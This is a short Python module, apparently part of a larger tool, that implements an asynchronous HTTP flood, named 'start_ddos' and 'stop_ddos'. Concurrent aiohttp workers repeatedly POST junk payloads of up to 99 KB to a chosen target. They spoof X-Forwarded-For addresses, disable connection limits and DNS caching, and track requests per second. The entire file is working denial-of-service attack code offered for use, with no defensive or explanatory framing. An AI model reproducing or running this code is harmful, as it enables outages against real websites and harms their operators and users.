import asyncio
import aiohttp
import random

_is_running = False
_total_requests = 0
_tasks = []
_monitor_task = None

async def _worker(worker_id, target, kb_size, on_update):
    global _is_running, _total_requests
    try:
        payload_kb = int(kb_size) if kb_size else 10
        if payload_kb > 99: payload_kb = 99
        if payload_kb <= 0: payload_kb = 1
        data = b"A" * (1024 * payload_kb)
    except:
        data = b"A" * 10240

    connector = aiohttp.TCPConnector(
        limit=0, limit_per_host=0, force_close=True,
        enable_cleanup_closed=True, ttl_dns_cache=0,
        use_dns_cache=False, ssl=False
    )
    session = aiohttp.ClientSession(connector=connector)

    try:
        while _is_running:
            try:
                fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                headers = {
                    "User-Agent": f"Fsociety-Worker-{worker_id}",
                    "X-Forwarded-For": fake_ip,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close"
                }
                async with session.post(target, data=data, headers=headers, timeout=10) as resp:
                    status = resp.status
                    await resp.read()
                _total_requests += 1
                on_update(_total_requests, fake_ip, status)
            except asyncio.CancelledError:
                break
            except Exception:
                _total_requests += 1
                on_update(_total_requests, fake_ip, None)
            await asyncio.sleep(0)
    finally:
        await session.close()

async def _monitor(on_stats):
    global _is_running
    last_count = 0
    start_time = asyncio.get_event_loop().time()
    while _is_running:
        await asyncio.sleep(1)
        current = _total_requests
        elapsed = asyncio.get_event_loop().time() - start_time
        rps = current - last_count
        on_stats(int(elapsed), rps, current)
        last_count = current

async def start_ddos(target, kb_size, workers, on_update, on_stats):
    global _is_running, _total_requests, _tasks, _monitor_task
    stop_ddos()
    _is_running = True
    _total_requests = 0
    _tasks.clear()
    for i in range(workers):
        task = asyncio.create_task(_worker(i, target, kb_size, on_update))
        _tasks.append(task)
    _monitor_task = asyncio.create_task(_monitor(on_stats))

def stop_ddos():
    global _is_running, _tasks, _monitor_task
    if _is_running:
        _is_running = False
        for task in _tasks:
            if not task.done():
                task.cancel()
        if _monitor_task and not _monitor_task.done():
            _monitor_task.cancel()
        _tasks.clear()
        _monitor_task = None

def is_ddos_running():
    return _is_running

def get_total_requests():
    return _total_requests